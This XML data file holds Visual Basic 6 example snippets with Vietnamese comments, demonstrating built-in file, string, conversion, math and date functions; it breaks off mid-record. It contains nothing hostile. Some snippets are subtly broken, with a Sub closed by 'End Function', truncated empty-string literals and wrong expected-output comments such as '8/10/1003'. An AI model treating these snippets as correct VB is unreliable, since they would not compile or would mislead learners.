<?xml version="1.0" standalone="yes"?>
<NewDataSet>
  <Vidu>
    <MaVD>0</MaVD>
    <NoiDung>Không có</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000001</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim SinhNhat As String
'Hien thi hop thoai nhap lieu
    SinhNhat = InputBox("Nhap vao ngay sinh cua ban", "nhap lieu", "01/01/1981", 0, 0)
    If IsDate(SinhNhat) Then ' kiem tra xem chuoi ngay sinh co phai la chuoi ngay thang khong
        MsgBox "Happy Birthday", VbOKOnly
    Else ' neu chuoi ngay sinh khong phai dang ngay thang
        MsgBox "Day khong phai la ngay sinh", vbExclamation
    End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000002</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim SinhNhat As String
'Hien thi hop thoai nhap lieu
    SinhNhat = InputBox("Nhap vao ngay sinh cua ban", "nhap lieu", "01/01/1981", 0, 0)
    If IsDate(SinhNhat) Then ' kiem tra xem chuoi ngay sinh co phai la chuoi ngay thang khong
        MsgBox "Happy Birthday", VbOKOnly
    Else ' neu chuoi ngay sinh khong phai dang ngay thang
        MsgBox "Day khong phai la ngay sinh", vbExclamation
    End If
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000003</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    ChDir "D:\MyPicture"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000004</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    ChDrive "D:\"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000005</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyPath
' Gia su duong dan hien tai tren o C la "C:\WINDOWS\SYSTEM" .
' Gia su duong dan hien tai tren o D la "D:\EXCEL".
' Gia su o dia hien hanh la o C
    MyPath = CurDir    ' Returns "C:\WINDOWS\SYSTEM".
    MyPath = CurDir("C") ' Returns "C:\WINDOWS\SYSTEM".
    MyPath = CurDir("D") ' Returns "D:\EXCEL".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000006</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyFile, MyPath, MyName
    ' Myfile = WIN.INI neu file do co ton tai
    MyFile = Dir("C:\WINDOWS\WIN.INI")
    ' Myfile = file dau tien trong thu muc C:Windows\ co duoi la INI
    MyFile = Dir("C:\WINDOWS\*.INI")
    ' Goi lai viec kiem tra
    MyFile = Dir
    ' Myfile = file dau tien trong thu muc C:Windows\ co duoi la TXT va co thuoc tinh an
    MyFile = Dir("*.TXT", vbHidden)
    MyPath = "c:\"   ' Gan MyPath = "C:\"
    MyName = Dir(MyPath, vbDirectory)   ' Gan MyName= ten thu muc dau tien trong MyPath
    Do While MyName &lt;&gt; "   ' Bat dau vong lap
       'Bo qua cac thu muc hien tai va thu muc xung quanh
        If MyName &lt;&gt; "." And MyName &lt;&gt; ".." Then
          ' Su dung su so sanh phan theo Bit de chac chac MyName la mot thu muc
            If (GetAttr(MyPath &amp; MyName) And vbDirectory) = vbDirectory Then
                Debug.Print MyName
            End If
       End If
       MyName = Dir   ' Nhay den thu muc ke tiep
    Loop
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000007</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    FileCopy "D:\MyFile.txt", "C:\MyFile.txt"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000008</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyStamp
' Gia su C:\TestFile.txt duoc chinh sua lan cuoi vao ngay 01/08/2003 4:10:45 PM
    MyStamp = FileDateTime("C:\TestFile.txt")   ' MyStamp = "01/08/2003 4:10:45 PM"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000009</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    FileLen "D:\MyFile.txt" 'Return so byte cua MyFile.txt
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000010</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyAttr
' Gia su TESTFILE co thuoc tinh an
    MyAttr = GetAttr("TESTFILE")   ' Returns 2.
' Gia su TESTFILE co thuoc tinh an va thuoc tinh chi doc
    MyAttr = GetAttr("TESTFILE")   ' Returns 3 = 2 + 1
' Gia su MYDIR la thu muc
    MyAttr = GetAttr("MYDIR")   ' Returns 16.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000011</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    Kill "D:\MyFile.txt"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000012</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    MkDir "D:\My Folder"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000013</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    RmDir "D:\My Folder"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000014</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
    SetAttr "TESTFILE", vbHidden   ' Gan thuoc tinh an cho TESTFILE
    SetAttr "TESTFILE", vbHidden + vbReadOnly   ' Gan thuoc tinh an va chi doc cho TESTFILE
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000015</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyArray(1 To 5) As Integer
Dim YourArray
Dim MyCheck As Boolean
    YourArray = Array(1, 2, 3)   ' Su dung ham Array
    MyCheck = IsArray(MyArray)   ' Returns True.
    MyCheck = IsArray(YourArray)   ' Returns True.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000016</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDate
Dim YourDate
Dim NoDate
Dim MyCheck As Boolean
    MyDate = "August 10, 2003": YourDate = #8/10/2003#: NoDate = "Hello"
    MyCheck = IsDate(MyDate)   ' Returns True.
    MyCheck = IsDate(YourDate)   ' Returns True.
    MyCheck = IsDate(NoDate)   ' Returns False.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000017</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyVar
Dim MyCheck As Boolean
    MyCheck = IsEmpty(MyVar)   ' Returns True.
    MyVar = Null   ' gan MyVar = Null
    MyCheck = IsEmpty(MyVar)   ' Returns False.
    MyVar = Empty   ' Assign Empty.
    MyCheck = IsEmpty(MyVar)   ' Returns True.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000018</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim ReturnValue
' The following statements call the user-defined function procedure.
    ReturnValue = ReturnTwice()   ' Returns Null.
    ReturnValue = ReturnTwice(2)   ' Returns 4.
End Function
'Khai bao mot ham
Function ReturnTwice(Optional A)
' Viec khai bao tu khoa Optional truoc tham so A de bao cho VB biet
' tham so A co truyen vao hay khong cung duoc
   If IsMissing(A) Then ' kiem tra xem tham so a co duoc truyen vao khong
      ' Neu gia tri A khong duoc truyen vao thi tra ve Null
      ReturnTwice = Null
   Else ' neu tham so a duoc truyen vao
      ReturnTwice = A * 2
   End If
End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000019</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyVar
Dim MyCheck As Boolean
    MyVar = "53"   ' Assign value.
    MyCheck = IsNumeric(MyVar)   ' Returns True.
    MyVar = "459.95"   ' Assign value.
    MyCheck = IsNumeric(MyVar)   ' Returns True.
    MyVar = "45 Help"   ' Assign value.
    MyCheck = IsNumeric(MyVar)   ' Returns False.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000020</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyVar
Dim MyCheck As Boolean
    MyCheck = IsNull(MyVar)   ' Returns False.
    MyVar = "
    MyCheck = IsNull(MyVar)   ' Returns False.
    MyVar = Null
    MyCheck = IsNull(MyVar)   ' Returns True.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000021</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim NullVar, MyType, StrVar As String, IntVar As Integer, CurVar As Currency
Dim ArrayVar(1 To 5) As Integer
    NullVar = Null   ' Gan gia tri Null cho bien NullVar
    MyType = TypeName(StrVar)   ' Returns "String".
    MyType = TypeName(IntVar)   ' Returns "Integer".
    MyType = TypeName(CurVar)   ' Returns "Currency".
    MyType = TypeName(NullVar)   ' Returns "Null".
    MyType = TypeName(ArrayVar)   ' Returns "Integer()".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000022</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim IntVar, StrVar, DateVar, MyCheck
' Khoi tao cac bien
    IntVar = 459: StrVar = "Hello World": DateVar = #2/12/1969#
    MyCheck = VarType(IntVar)   ' Returns 2.
    MyCheck = VarType(DateVar)   ' Returns 7.
    MyCheck = VarType(StrVar)   ' Returns 8.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000023</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim A, B
Dim Check As Boolean
    A = 5: B = 5   'Khoi tao bien
    Check = CBool(A = B)   ' Returns True
    A = 0   ' Define variable.
    Check = CBool(A)   ' Returns False
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000024</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDouble, MyByte
    MyDouble = 125.5678   ' khoi tao
    MyByte = CByte(MyDouble)   ' MyByte = 126.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000026</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDate, MyShortDate, MyTime, MyShortTime
    MyDate = "August 10, 2003"   ' Khoi tao
    MyShortDate = CDate(MyDate)   'Returns 8/10/1003
    MyTime = "4:35:47 PM"   ' Khoi tao
    MyShortTime = CDate(MyTime)   'Returns 4:35:47 PM
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000027</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyCurr, MyDouble
    MyCurr = CCur(234.456784)
    MyDouble = CDbl(MyCurr * 8.2 * 0.01)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000028</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDecimal, MyCurr
    MyCurr = 10000000.0587
    MyDecimal = CDec(MyCurr) ' Returns 10000000.0587
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000029</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDouble, MyInt
    MyDouble = 2345.5678   ' Khoi tao
    MyInt = CInt(MyDouble)   ' Returns 2346.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000030</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyVal1, MyVal2, MyLong1, MyLong2
    MyVal1 = 25427.45: MyVal2 = 25427.55   ' Khoi tao
    MyLong1 = CLng(MyVal1)   'Returns 25427.
    MyLong2 = CLng(MyVal2)   'Returns 25428.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000031</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDouble1, MyDouble2, MySingle1, MySingle2
    MyDouble1 = 75.3421115: MyDouble2 = 75.3421555 ' khoi tao
    MySingle1 = CSng(MyDouble1)   ' Returns 75.34211.
    MySingle2 = CSng(MyDouble2)   ' Returns  75.34216.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000032</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDouble, MyString
    MyDouble = 437.324   ' Khoi tao
    MyString = CStr(MyDouble)   ' Returns "437.324".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000033</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyInt, MyVar
    MyInt = 4534   ' MyInt is an Integer.
    MyVar = CVar(MyInt &amp; "000")   ' MyVar contains the string 4534000.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000034</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyNumber
    MyNumber = Asc("A")   ' Returns 65.
    MyNumber = Asc("a")   ' Returns 97.
    MyNumber = Asc("Apple")   ' Returns 65.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000035</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyNumber
    MyNumber = AscW("A")   ' Returns 65.
    MyNumber = AscW("a")   ' Returns 97.
    MyNumber = AscW("Apple")   ' Returns 65.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000036</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyChar
    MyChar = Chr(65)   ' Returns A.
    MyChar = Chr(97)   ' Returns a.
    MyChar = Chr(62)   ' Returns &gt;.
    MyChar = Chr(37)   ' Returns %.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000037</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyChar
    MyChar = ChrW(65)   ' Returns A.
    MyChar = ChrW(97)   ' Returns a.
    MyChar = ChrW(62)   ' Returns &gt;.
    MyChar = ChrW(37)   ' Returns %.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000038</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim selNames() As String
Dim Names(1 To 5) As String
    Names(1) = "A"
    Names(2) = "B"
    Names(3) = "C"
    Names(4) = "D"
    Names(5) = "E"
    selNames = Filter(Names, "A") ' Returns "A"
    selNames = Filter(Names, "B", False) 'Returns "A", "C", "D", "E"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000039</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim SearchString, SearchChar, MyPos
    SearchString = "XXpXXpXXPXXP"  ' String to search in.
    SearchChar = "P"   ' Search for "P".
' So sanh theo cua text tu vi tri 4
    MyPos = InStr(4, SearchString, SearchChar, 1) ' Returns 6.
' So sanh theo Binary
    MyPos = InStr(1, SearchString, SearchChar, 0) ' Returns 9.
' So sanh theo Binary, do mac dinh la 0
    MyPos = InStr(SearchString, SearchChar)   ' Returns 9.
    MyPos = InStr(1, SearchString, "W")   ' Returns 0.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000040</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim SearchString, SearchChar, MyPos
    SearchString = "XXpXXpXXPXXP"  ' String to search in.
    SearchChar = "Xp"   ' Search for "Xp".
    MyPos = InStrRev(SearchString, SearchChar, 4, 1) 'Returns 2
    MyPos = InStrRev(SearchString, SearchChar, 10, 1) 'Returns 8
    MyPos = InStrRev(SearchString, SearchChar,, 1) 'Returns 11
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000041</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim aSplit() As String
Dim Names(1 To 5) As String
Dim MyStr As String
    Names(1) = "A"
    Names(2) = "B"
    Names(3) = "C"
    Names(4) = "D"
    Names(5) = "E"
    MyStr = Join(Names(), "/") 'Returns "A/B/C/D/E"
    aSplit = Split(MyStr, "/", 5) 'Returns aSplit(0)="A",...,aSplit(4)="E"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000042</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim UpperCase, LowerCase
    UpperCase = "Hello WORLD 1234"   ' Khoi tao
    LowerCase = LCase(UpperCase)   ' Returns "hello world 1234".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000043</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim AnyString, MyStr
    AnyString = "Hello World"   ' Khoi tao
    MyStr = Left(AnyString, 1)   ' Returns "H".
    MyStr = Left(AnyString, 7)   ' Returns "Hello W".
    MyStr = Left(AnyString, 20)   ' Returns "Hello World".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000044</MaVD>
    <NoiDung>Option Explicit
Private Type CustomerRecord
   ID As Integer   ' Len(ID)=2
   Name As String * 10
   Address As String * 30
End Type
Private Sub Form_Load()
Dim Customer As CustomerRecord
Dim MyInt As Integer, MyCur As Currency
Dim MyString, MyLen
    MyString = "Hello World"   ' Khoi tao
    MyLen = Len(MyInt)   ' Returns 2.
    MyLen = Len(Customer)   ' Returns 42.
    MyLen = Len(MyString)   ' Returns 11.
    MyLen = Len(MyCur)   ' Returns 8.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000045</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyString, TrimString
    MyString = "  &lt;-Trim-&gt;  "   ' Khoi tao
    TrimString = LTrim(MyString)   ' Returns = "&lt;-Trim-&gt;  ".
    TrimString = RTrim(MyString)   ' Returns = "  &lt;-Trim-&gt;".
    TrimString = LTrim(RTrim(MyString))   ' Returns = "&lt;-Trim-&gt;".
    TrimString = Trim(MyString)   ' Returns = "&lt;-Trim-&gt;".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000047</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim AnyString, MyStr
    AnyString = "Hello World"   ' Khoi tao
    MyStr = Replace(AnyString, "Hel", "AAAAA", 1, -1, vbTextCompare) 'Returns "AAAAAlo World"
    MyStr = Replace(AnyString, "Wor", "BBB", 1, -1, vbTextCompare) 'Returns "Hello BBBld"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000048</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim AnyString, MyStr
    AnyString = "Hello World"   ' Khoi tao
    MyStr = Right(AnyString, 1)   ' Returns "d".
    MyStr = Right(AnyString, 7)   ' Returns "o World".
    MyStr = Right(AnyString, 20)   ' Returns "Hello World".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000049</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyString, TrimString
    MyString = "  &lt;-Trim-&gt;  "   ' Khoi tao
    TrimString = LTrim(MyString)   ' Returns = "&lt;-Trim-&gt;  ".
    TrimString = RTrim(MyString)   ' Returns = "  &lt;-Trim-&gt;".
    TrimString = LTrim(RTrim(MyString))   ' Returns = "&lt;-Trim-&gt;".
    TrimString = Trim(MyString)   ' Returns = "&lt;-Trim-&gt;".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000050</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyString
    MyString = Space(10) 'Returns "          "
    MyString = "Hello" &amp; Space(10) &amp; "World" ' Returns "Hello          World"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000051</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim aSplit() As String
Dim Names(1 To 5) As String
Dim MyStr As String
    Names(1) = "A"
    Names(2) = "B"
    Names(3) = "C"
    Names(4) = "D"
    Names(5) = "E"
    MyStr = Join(Names(), "/") 'Returns "A/B/C/D/E"
    aSplit = Split(MyStr, "/", 5) 'Returns aSplit(0)="A",...,aSplit(4)="E"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000052</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyStr1, MyStr2, MyComp
    MyStr1 = "ABCD": MyStr2 = "abcd"   ' Khoi tao
    MyComp = StrComp(MyStr1, MyStr2, 1)   ' Returns 0.
    MyComp = StrComp(MyStr1, MyStr2, 0)   ' Returns -1.
    MyComp = StrComp(MyStr2, MyStr1)   ' Returns 1.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000053</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim i As Long
Dim x() As Byte
    x = StrConv("ABCDEFG", vbFromUnicode)   ' Convert string.
    For i = 0 To UBound(x)
        Debug.Print x(i)
    Next
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000054</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim sReverse As String
    sReverse = StrReverse("1234567") ' Returns "7654321"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000055</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyString, TrimString
    MyString = "  &lt;-Trim-&gt;  "   ' Khoi tao
    TrimString = LTrim(MyString)   ' Returns = "&lt;-Trim-&gt;  ".
    TrimString = RTrim(MyString)   ' Returns = "  &lt;-Trim-&gt;".
    TrimString = LTrim(RTrim(MyString))   ' Returns = "&lt;-Trim-&gt;".
    TrimString = Trim(MyString)   ' Returns = "&lt;-Trim-&gt;".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000057</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyTime, MyDate, MyStr
    MyTime = #5:04:23 PM#
    MyDate = #August 10, 2003#
    ' Tra ve gio hien tai theo format Long Time
    MyStr = Format(Time, "Long Time")
    ' Tra ve ngay hien tai theo format Long Date
    MyStr = Format(Date, "Long Date")
    MyStr = Format(MyTime, "h:m:s")   ' Returns "17:4:23".
    MyStr = Format(MyTime, "hh:mm:ss AMPM")   ' Returns "05:04:23 PM".
    MyStr = Format(MyDate, "dddd, mmm d yyyy")   ' Returns "Sunday, Aug 10 2003".
    MyStr = Format(23)   ' Returns "23".
    ' Mot so dinh dang theo nguoi dung
    MyStr = Format(5459.4, "##,##0.00")   ' Returns "5,459.40".
    MyStr = Format(334.9, "###0.00")   ' Returns "334.90".
    MyStr = Format(5, "0.00%")   ' Returns "500.00%".
    MyStr = Format("HELLO", "&lt;")   ' Returns "hello".
    MyStr = Format("This is it", "&gt;")   ' Returns "THIS IS IT
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000058</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyStr
    MyStr = FormatCurrency("12345", 5) 'Returns $12,345.00000
    MyStr = FormatCurrency("12.345", 5) 'Returns $12.34500
    MyStr = FormatCurrency("12.345", 3) 'Returns $12.345
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000059</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyTime, MyDate, MyStr
    MyTime = #3:08:56 PM#
    MyDate = #8/10/2003#
    MyStr = FormatDateTime(MyTime, vbShortTime) 'Returns "15:08"
    MyStr = FormatDateTime(MyDate, vbLongDate) 'Returns "Tueday, August 10, 2003"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000060</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyStr
    MyStr = FormatNumber("12345", 5) 'Returns 12,345.00000
    MyStr = FormatNumber("12.345", 5) 'Returns 12.34500
    MyStr = FormatNumber("12.345", 3) 'Returns 12.345
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000061</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyStr
    MyStr = FormatPercent("12345", 5) 'Returns 1,234,500.00000%
    MyStr = FormatPercent("12.345", 5) 'Returns 1,234.50000%
    MyStr = FormatPercent("12.345", 3) 'Returns 1,234.500%
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000062</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyString
    MyString = Str(459)   ' Returns " 459".
    MyString = Str(-459.65)   ' Returns "-459.65".
    MyString = Str(459.001)   ' Returns " 459.001".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000063</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyValue
    MyValue = Val("2457")   ' Returns 2457.
    MyValue = Val(" 2 45 7")   ' Returns 2457.
    MyValue = Val("24 and 57")   ' Returns 24.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000064</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyNumber
    MyNumber = Abs(50.3)   ' Returns 50.3.
    MyNumber = Abs(-50.3)   ' Returns 50.3.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000065</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim Pi
    Pi = 4 * Atn(1) ' Tinh gia tri cua hang so Pi
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000066</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyAngle, MySecant
    MyAngle = 1.3   ' Khoi tao
    MySecant = 1 / Cos(MyAngle) ' Tinh secant
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000067</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyAngle, MyHSin
    MyAngle = 1.3 'Khoi tao
'  Tinh hyperbolic sine.
    MyHSin = (Exp(MyAngle) - Exp(-1 * MyAngle)) / 2
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000068</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyNumber
    MyNumber = Int(99.8)   ' Returns 99.
    MyNumber = Fix(99.2)   ' Returns 99.
    MyNumber = Int(-99.8)   ' Returns -100.
    MyNumber = Fix(-99.8)   ' Returns -99.
    MyNumber = Int(-99.2)   ' Returns -100.
    MyNumber = Fix(-99.2)   ' Returns -99.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000069</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyHex
    MyHex = Hex(5)   ' Returns 5.
    MyHex = Hex(10)   ' Returns A.
    MyHex = Hex(459)   ' Returns 1CB
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000070</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyNumber
    MyNumber = Int(99.8)   ' Returns 99.
    MyNumber = Fix(99.2)   ' Returns 99.
    MyNumber = Int(-99.8)   ' Returns -100.
    MyNumber = Fix(-99.8)   ' Returns -99.
    MyNumber = Int(-99.2)   ' Returns -100.
    MyNumber = Fix(-99.2)   ' Returns -99.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000071</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyAngle, MyLog
    MyAngle = 1.3 ' Khoi tao
' Tinh nghinh dao hyperbolic sine.
    MyLog = Log(MyAngle + Sqr(MyAngle * MyAngle + 1))
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000072</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyOct
    MyOct = Oct(4)    ' Returns 4.
    MyOct = Oct(8)   ' Returns 10.
    MyOct = Oct(459)   ' Returns 713
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000073</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyRound
    MyRound = Round(1.2345, 3) 'Returns 1.234
    MyRound = Round(1.2346, 3) 'Returns 1.235
    MyRound = Round(12.345, 1) 'Returns 12.3
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000074</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyAngle, MyCosecant
    MyAngle = 1.3   ' Khoi tao
    MyCosecant = 1 / Sin(MyAngle)   ' Tinh cosecant.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000075</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MySqr
    MySqr = Sqr(4)   ' Returns 2.
    MySqr = Sqr(23)   ' Returns 4.79583152331272.
    MySqr = Sqr(0)   ' Returns 0.
    MySqr = Sqr(-4)   ' Loi, do khong the lay can cua 1 so am
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000076</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyAngle, MyCotangent
    MyAngle = 1.3   ' Khoi tao
    MyCotangent = 1 / Tan(MyAngle)   ' Tinh cotangent.
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000077</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim FirstDate As Date
Dim IntervalType As String
Dim Number As Integer
Dim Msg
    IntervalType = "m"   ' "m" gan don vi la thang
    FirstDate = InputBox("Nhap vao thoi gian") ' Vi du 08/10/2003
    Number = InputBox("Nhap vao so thang ban muon them") '3
    ' Returns 11/10/2003
    Msg = "New date: " &amp; DateAdd(IntervalType, Number, FirstDate)
    MsgBox Msg
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000078</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim TheDate As Date
